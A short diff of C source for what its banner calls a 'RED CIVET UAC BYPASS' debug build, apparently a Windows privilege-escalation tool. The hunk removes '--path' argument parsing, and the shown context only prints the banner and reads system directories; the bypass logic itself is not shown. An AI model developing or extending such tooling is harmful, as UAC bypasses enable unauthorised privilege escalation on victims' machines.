@@ -145,24 +145,6 @@ int main() {
 
     printf("--- RED CIVET UAC BYPASS: DEBUG VERSION ---\n");
 
-    // 2. PARSE ARGS
-    BOOL pathProvided = FALSE;
-    if (szArglist != NULL && nArgs >= 3) {
-        for (int i = 1; i < nArgs; i++) {
-            if (_wcsicmp(szArglist[i], L"--path") == 0) {
-                wcsncpy_s(targetPath, MAX_PATH, szArglist[i + 1], _TRUNCATE);
-                pathProvided = TRUE;
-                break;
-            }
-        }
-    }
-
-    if (!pathProvided) {
-        printf("[!] ERROR: Use --path \"C:\\Windows\\Temp\"\n");
-        if (szArglist) LocalFree(szArglist);
-        return 0;
-    }
-
     // 3. INIT DIRECTORIES (Local stack instead of g_ctx)
     GetSystemDirectoryW(szSystemDir, MAX_PATH);
     GetWindowsDirectoryW(szWindowsDir, MAX_PATH);
